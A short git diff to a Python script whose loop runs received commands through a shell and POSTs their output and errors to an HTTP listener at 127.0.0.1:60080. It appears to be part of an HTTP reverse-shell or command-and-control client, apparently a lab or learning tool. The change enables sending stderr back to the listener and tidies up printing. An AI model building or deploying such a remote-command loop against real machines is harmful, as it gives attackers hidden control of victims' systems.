@@ -24,9 +24,9 @@ while True:
         else:
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s = CMD.stdout.read()
-            print(s)
+            print(s.decode('utf-8'))
             post_response = requests.post(url='http://127.0.0.1:60080', data= s) # POST the result 
-            # post_response = requests.post(url='http://127.0.0.1:60080', data=CMD.stderr.read() ) # or the error -if any-
+            post_response = requests.post(url='http://127.0.0.1:60080', data=CMD.stderr.read() ) # or the error -if any-
 
     except Exception as ex:
         # no output in git shell, use cmd.exe !!
